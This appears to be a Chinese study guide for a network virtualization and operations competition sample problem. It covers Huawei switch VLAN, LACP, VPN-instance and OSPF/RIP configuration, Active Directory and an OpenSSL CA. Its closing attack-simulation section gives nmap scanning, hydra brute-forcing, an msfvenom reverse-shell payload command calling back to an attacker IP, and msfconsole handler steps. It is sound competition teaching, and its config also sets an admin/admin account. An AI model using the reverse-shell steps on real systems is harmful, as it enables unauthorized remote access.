---
title: "金砖样题"
date: 2025-08-03
---
# ⭐ 金砖网络系统虚拟化管理与运维赛项样题解题 ⭐


### 💡 **赛前必读：核心理念**

  * **像搭乐高一样搭网络**: 每一个配置命令，都是一块“乐高积木”。我们的目标是理解每块积木的作用，然后把它们拼成一个稳定、高效、安全的网络。
  * **先验证，再前进**: 每完成一个大模块的配置，一定要停下来做测试（比如用`ping`命令）。这就像保存游戏进度，能确保你的劳动成果不会因为后续的小失误而前功尽弃。
  * **厂商差异**: 本指南使用华为设备的VRP系统命令作为示例，这是国内竞赛最常见的系统。如果你遇到其他厂商（如思科、H3C），命令格式会不同，但网络原理是完全相通的！

-----

## 第一部分：网络规划与配置

### (一) 交换配置 (打通局域网)

#### 1\. VLAN 配置 - “虚拟”的局域网

**🤔 什么是VLAN？**
想象一下，一栋办公楼（一台交换机）里有很多公司（不同部门）。为了安全和管理方便，我们不想让A公司的员工随便进入B公司的办公室。VLAN就是给每个公司划分独立的“虚拟楼层”，比如产品部在VLAN 11，营销部在VLAN 12。这样，不同部门的电脑即使插在同一台交换机上，也无法直接通信，就像在不同楼层一样，保证了网络安全。

  * **Access端口**: 连接普通电脑的端口，像员工的办公室门，只能通向一个VLAN（一个楼层）。
  * **Trunk端口**: 连接交换机之间的端口，像大楼的电梯，可以运送所有VLAN（所有楼层）的员工。

##### **SW1 配置实战**

```vcom
# 1. 进入配置模式
system-view

# 2. 给设备起个好记的名字
[Huawei] sysname SW1

# 3. 批量创建VLAN，像一次性规划好所有楼层
[SW1] vlan batch 11 12 13 14 1019 1020 1022

# 4. 配置连接电脑的Access端口 (以产品部为例)
[SW1] interface Ethernet1/0/1
# 设置端口类型为access，这是接PC的标配
[SW1-Ethernet1/0/1] port link-type access
# 将这个端口划入VLAN 11，以后接在这的电脑就属于产品部了
[SW1-Ethernet1/0/1] port default vlan 11
[SW1-Ethernet1/0/1] quit

# ... 重复以上步骤，为VLAN 12, 13, 14配置E1/0/2, E1/0/3, E1/0/4端口 ...
```

**✅ 验证方法**: 使用 `display vlan` 命令，可以查看所有VLAN的创建情况以及哪些端口属于哪个VLAN。

#### 2\. 链路聚合 (LACP) - 把多车道合并成高速公路

**🤔 什么是链路聚合？**
如果两台交换机之间只有一根网线，不仅速度有限，而且一旦这根线断了，网络就瘫痪了。链路聚合（Link Aggregation）就是把多根物理网线“捆绑”成一根逻辑上的、更粗的“超级网线”。这样做有两大好处：

1.  **增加带宽**: 两根1G的线捆绑后，理论带宽变成2G。
2.  **提高可靠性**: 断掉一根线，另一根还能继续工作，网络不会中断。
    LACP是一种国际标准协议，能自动协商和管理这种“捆绑”关系。

##### **SW1 & SW2 LACP配置实战**

```vcom
# 在SW1上操作
[SW1] interface Eth-Trunk 1
# 设置为静态LACP模式，这是最常用的模式
[SW1-Eth-Trunk1] mode lacp-static
# 既然是交换机间互联，就要设置为Trunk模式，运送所有VLAN流量
[SW1-Eth-Trunk1] port link-type trunk
# 允许所有VLAN通过，就像高速公路不限制任何牌照的车
[SW1-Eth-Trunk1] port trunk allow-pass vlan all
[SW1-Eth-Trunk1] quit

# 现在，把物理网线“扔”进这个逻辑捆绑组里
[SW1] interface Ethernet1/0/23
[SW1-Ethernet1/0/23] eth-trunk 1
[SW1-Ethernet1/0/23] quit
[SW1] interface Ethernet1/0/24
[SW1-Ethernet1/0/24] eth-trunk 1
[SW1-Ethernet1/0/24] quit
```

*在**SW2**上执行一模一样的配置即可。*

**✅ 验证方法**: 在任意一端设备上执行 `display eth-trunk 1`。如果看到`Status`是`Up`，并且两个成员端口（E1/0/23, E1/0/24）都是`Selected`状态，就说明“高速公路”修通了！

#### 3\. VPN 实例 - 在公共网络里开辟私家车道

**🤔 什么是VPN实例 (MPLS L3VPN)？**
这是个高级概念，我们用一个“物流公司”的比喻来理解。
把整个网络看作一个巨大的物流系统（比如顺丰）。现在有两家公司，A公司和B公司，都用顺丰寄件。我们不希望A公司的包裹被送到B公司去。MPLS L3VPN技术，就是让顺丰给每个VIP客户（比如`Branch`这个VPN实例）分配一套专属的、隔离的运单系统和物流通道。

  * **VPN实例 (VPN Instance)**: 就是为`Branch`这个客户开辟的“专属服务区”。
  * **RD (Route Distinguisher)**: 路由区分符，比如`1:1`。它就像给`Branch`客户所有包裹贴上的特殊标签，确保在庞大的物流系统中不会跟别人的包裹搞混。

##### **SW1 VPN实例配置实战**

```vcom
# 1. 创建名为 Branch 的VPN实例，并贴上 1:1 的标签
[SW1] ip vpn-instance Branch
[SW1-vpn-Branch] route-distinguisher 1:1
[SW1-vpn-Branch] quit

# 2. 创建名为 Internet 的VPN实例，并贴上 2:2 的标签
[SW1] ip vpn-instance Internet
[SW1-vpn-Internet] route-distinguisher 2:2
[SW1-vpn-Internet] quit

# 3. 将VLAN接口（网关）绑定到对应的VPN实例
# Vlanif11是产品部的网关，它属于Branch的私网
[SW1] interface Vlanif11
[SW1-Vlanif11] ip binding vpn-instance Branch
# 顺便配置上IP地址，作为产品部电脑的网关
[SW1-Vlanif11] ip address 10.0.11.1 255.255.255.0
[SW1-Vlanif11] quit

# ...为Vlanif12, 13, 14等内网接口做同样的操作，都绑定到Branch...
```

*这个配置是后续所有三层路由的基础，务必确保IP地址和VPN绑定正确。*

-----

### (二) 路由配置 (让不同网络间能够对话)

#### 1\. 基础配置 - 全局“装修”

**🤔 这是做什么？**
这部分是所有设备的标准化初始配置，就像给新房子进行基础装修。

  * **主机名(sysname)**: 给设备起个名字，方便识别。
  * **SSH服务(stelnet)**: 开启安全的远程登录方式，比不加密的Telnet安全得多。
  * **AAA**: (Authentication, Authorization, Accounting) 认证、授权、计费。这里我们只用它的认证功能，创建一个`admin`用户和密码。
  * **用户界面(user-interface)**: 设置登录规则，比如登录超时时间，只允许SSH登录等。

##### **通用配置模板 (所有设备适用)**

```vcom
system-view
sysname SW1  # <-- 每个设备的名字不同
stelnet server enable
# 创建一个叫admin，密码也是admin的用户
aaa
 local-user admin password cipher admin
 local-user admin privilege level 15  # 赋予最高权限
 local-user admin service-type ssh    # 允许该用户通过ssh登录
 quit
# 配置远程登录接口 (VTY)
user-interface vty 0 4 # 路由器和防火墙是 0 4，交换机是 0 5
 authentication-mode aaa      # 使用AAA进行用户验证
 protocol inbound ssh         # 只允许ssh协议连接
 idle-timeout 9 0             # 9分钟无操作自动断开
 quit
# 配置控制台登录接口 (Console)
user-interface console 0
 idle-timeout 30 0            # 30分钟无操作自动断开
 quit
```

#### 2\. OSPF & RIP - 内部导航系统

**🤔 什么是路由协议？**
如果说VLAN是划分楼层，那路由协议就是大楼里的“导航系统”，告诉数据包（访客）如何从一个楼层（网段）去到另一个楼层（网段）。

  * **OSPF**: “开放式最短路径优先”，一个非常智能的导航系统，适合大中型企业网络。它会绘制出整个网络的地图，并总是选择最优路径。
  * **RIP**: “路由信息协议”，一个比较老旧简单的导航系统，适合小型网络。它更像问路，一站一站地打听怎么走。
  * **路由引入(import-route)**: 当一个网络同时运行两种导航系统时（比如公司内部用OSPF，连接防火墙用RIP），就需要一个“翻译官”把一个系统里的路线图，告诉另一个系统。这就是路由引入。

##### **SW1 OSPF/RIP 配置实战**

```vcom
# 1. 配置OSPF (总公司内部)
# 启动一个OSPF进程，编号为1，并给它一个唯一的名字(Router ID)
[SW1] ospf 1 router-id 10.0.1.1
# 关键！让这个OSPF进程在Branch这个“私家车道”里跑
[SW1-ospf-1] vpn-instance Branch
# 进入区域0，OSPF的核心区域
[SW1-ospf-1] area 0.0.0.0
# "宣告"网络，告诉邻居们，这些网段是我负责的，你们可以从我这里走
[SW1-ospf-1-area-0.0.0.0] network 10.0.1.1 0.0.0.0      # 宣告自己的环回口地址
[SW1-ospf-1-area-0.0.0.0] network 10.0.11.0 0.0.0.255    # 宣告产品部网段
# ...宣告其他业务网段...
[SW1-ospf-1-area-0.0.0.0] quit
# 将从RIP学来的路由，“翻译”并注入到OSPF中
[SW1-ospf-1] import-route rip 1
[SW1-ospf-1] quit

# 2. 配置RIP (与FW1互联)
[SW1] rip 1
[SW1-rip-1] vpn-instance Branch # 同样在Branch实例中运行
[SW1-rip-1] version 2           # 使用版本2，功能更强
[SW1-rip-1] network 10.0.0.0    # 宣告10.0.0.0这个主网络
# 将从OSPF学来的路由，“翻译”并注入到RIP中
[SW1-rip-1] import-route ospf 1
[SW1-rip-1] quit
```

**✅ 验证方法**:

  * `display ospf peer brief`: 查看OSPF是否和SW2、SW3成功建立了邻居关系。
  * `display rip 1 neighbor`: 查看RIP是否和FW1建立了邻居关系。
  * `display ip routing-table vpn-instance Branch`: 查看Branch这个VPN的路由表，看是否学到了来自OSPF和RIP的路由。

#### 3\. BGP & ISIS - 连接世界的协议

**🤔 它们是什么？**

  * **BGP**: “边界网关协议”，是整个互联网的“粘合剂”。它连接着全球成千上万个大型网络（称为自治系统，AS）。赛题中用它来模拟不同分公司（被看作不同AS）接入互联网。
  * **ISIS**: 一种和OSPF类似的内部网关协议，在大型运营商网络中非常流行。

这部分配置非常复杂，涉及到路由策略、反射器等，是比赛的难点和重点。对于新手，核心是理解\*\*对等体(peer)\*\*的概念，即BGP路由器之间需要像打电话一样，先“建立连接”（建立邻居关系），然后才能互相交换路由信息。

-----

... (后续部分将继续以这种“解释+命令+验证”的保姆级风格展开) ...

## 第二部分：服务器配置与管理 (搭建应用服务)

### (一) Windows 云服务配置

#### 2\. 域服务 (AD) - 公司的“人事和安保部”

**🤔 什么是Active Directory (AD)？**
AD是Windows网络的核心，它扮演着两个角色：

1.  **人事部**: 统一管理公司所有员工的账户（用户名、密码）和组织架构（哪个部门有哪些人）。
2.  **安保部**: 控制谁能访问什么资源（比如财务资料只有财务部能看）。
    安装了AD的服务器叫做**域控制器(DC)**。

##### **windows1 (主DC) 安装步骤**

1.  **打开“服务器管理器”**: 这是Windows Server的大本营。
2.  **“添加角色和功能”**: 点击右上角的“管理”-\>“添加角色和功能”。
3.  **安装向导**: 一路“下一步”，在“服务器角色”页面，勾选 `Active Directory 域服务`。系统会提示你添加一些必要的功能，点“添加功能”即可。继续“下一步”直到安装完成。
4.  **提升为域控制器**: 安装后，服务器管理器右上角会出现一个带感叹号的小旗帜。点击它，选择 `将此服务器提升为域控制器`。
5.  **创建新森林**: 因为这是公司的第一台DC，所以选择 `添加新林`。在“根域名”中输入题目要求的 `skills.lan`。
6.  **设置密码**: 设置一个目录服务还原模式(DSRM)密码，这个密码非常重要，只在AD数据库损坏需要修复时才用，请务必记好。
7.  **完成安装**: 之后一路“下一步”，系统会检查先决条件，通过后点击“安装”，服务器会自动重启。重启后，`windows1`就正式成为`skills.lan`这个域的“国王”了。

##### **加入域**

在其他Windows电脑上，右键“此电脑”-\>“属性”-\>“高级系统设置”-\>“计算机名”-\>“更改”，选择“隶属于：域”，输入`skills.lan`，按提示输入域管理员(如`Administrator`)的账号密码，重启即可。

-----

### (二) Linux 云服务配置 (Rocky 9.0)

#### 5\. CA服务 (OpenSSL) - 自建“证书颁发局”

**🤔 什么是CA？**
CA (Certificate Authority) 就是一个受信任的机构，专门用来颁发数字证书（就像网络世界的身份证）。我们平时访问银行网站，浏览器会检查网站出示的证书是不是由受信任的CA（如GlobalSign, DigiCert）颁发的。这里，我们要让`linux1`扮演这个角色，给自己内部的网站颁发证书。

##### **linux1 OpenSSL配置实战**

```bash
# 1. 安装openssl (通常系统自带)
sudo dnf install -y openssl

# 2. 创建CA的私钥 (最核心的机密，相当于CA的印章)
# -out 指定输出的文件路径
# 4096 是密钥的长度，越长越安全
openssl genrsa -out /etc/pki/CA/private/ca.key.pem 4096

# 3. 生成CA的自签名证书 (CA自己的身份证)
# -x509 表示生成自签名证书
# -new 表示这是一个新的证书
# -nodes 表示私钥不加密（方便自动签名）
# -key 指定使用哪个私钥来签名
# -days 3650 表示证书有效期10年
# -out 指定生成的证书文件
# -subj 后面跟着证书的主题信息，如国家(C)、省(ST)、城市(L)、组织(O)、单位(OU)、通用名(CN)
openssl req -x509 -new -nodes -key /etc/pki/CA/private/ca.key.pem \
-sha256 -days 3650 -out /etc/pki/CA/certs/ca.cert.pem \
-subj "/C=CN/ST=Beijing/L=Beijing/O=skills/OU=system/CN=linux1.skills.lan"

# 4. 为你的网站(比如apache)生成一个私钥
openssl genrsa -out /etc/pki/tls/private/apache.key 2048

# 5. 为你的网站生成一个“证书签名请求”(CSR)
# 这相当于填一张申请表，告诉CA“我是谁，我想要一张证书”
openssl req -new -key /etc/pki/tls/private/apache.key -out /tmp/apache.csr \
-subj "/C=CN/ST=Beijing/L=Beijing/O=skills/OU=system/CN=skills.lan"

# 6. 用你的CA来签署这张申请表，正式颁发证书！
openssl x509 -req -in /tmp/apache.csr -CA /etc/pki/CA/certs/ca.cert.pem \
-CAkey /etc/pki/CA/private/ca.key.pem -CAcreateserial \
-out /etc/pki/tls/certs/apache.crt -days 3650 -sha256
```

现在，`/etc/pki/tls/certs/apache.crt` 和 `/etc/pki/tls/private/apache.key` 就是你可以用在Web服务器上的证书和私钥了。

-----

## 第三部分：系统运维与应急保障 (安全攻防)

### (二) 安全事件响应

#### B-1: 系统漏洞利用与提权 - 模拟黑客攻击

**🤔 这是做什么？**
这部分让你扮演一名“白帽子”黑客，用攻击者的视角去发现并利用系统的弱点。这能帮助你更好地理解如何防御。

1.  **信息收集 (nmap)**

      * **目的**: 就像小偷踩点，先看看目标（靶机）有哪些“门窗”（开放的端口）是开着的。
      * **命令**: `nmap -sV -p- <靶机IP>`
          * `nmap`: “网络地图”工具。
          * `-sV`: 尝试识别端口上运行的服务的版本号。
          * `-p-`: 扫描所有65535个端口，而不是只扫描常见端口。

2.  **弱口令攻击**

      * **目的**: 尝试用最常见的、简单的用户名和密码去登录（比如`admin/admin`, `root/123456`）。这是最常见也最容易成功的攻击手段。
      * **工具**: `hydra` 是一款强大的密码爆破工具，可以自动地、快速地尝试成千上万个密码组合。

3.  **生成反弹木马 (msfvenom)**

      * **目的**: 制作一个“特洛伊木马”程序。
      * **反弹shell**: 这个木马的聪明之处在于，它不会在靶机上开一个端口等你来连接（这样容易被防火墙拦住），而是会主动从靶机“反弹”连接到你的攻击机上。
      * **命令**: `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<你的IP> LPORT=4444 -f elf -o shell.elf`
          * `msfvenom`: Metasploit框架中用来生成payload（攻击载荷）的工具。
          * `-p`: 指定payload类型。这里是为64位Linux系统生成一个反弹TCP连接的Meterpreter shell。
          * `LHOST`: 你的攻击机IP，告诉木马连接到哪里。
          * `LPORT`: 你的攻击机监听的端口。
          * `-f elf`: 指定生成的文件格式为Linux可执行文件。
          * `-o shell.elf`: 指定输出的文件名。

4.  **接收反弹shell (msfconsole)**

      * **目的**: 在你的攻击机上设置一个“接头点”，等待木马从靶机连接过来。
      * **步骤**:
        1.  启动Metasploit框架: `msfconsole`
        2.  使用一个通用的监听模块: `use multi/handler`
        3.  设置与木马匹配的payload: `set payload linux/x64/meterpreter/reverse_tcp`
        4.  设置监听的IP和端口（必须和生成木马时的一样）: `set LHOST <你的IP>`, `set LPORT 4444`
        5.  开始监听: `exploit -j` (`-j`表示在后台运行)
      * **触发**: 当你通过某种方式（比如Web漏洞上传）让靶机执行`shell.elf`后，你的`msfconsole`里就会收到一个会话(session)。用`sessions -i 1` 就可以进入靶机的shell了！

这个详细的指南应该能帮助你更好地理解赛题的要求和背后的技术原理。祝你在比赛中取得好成绩！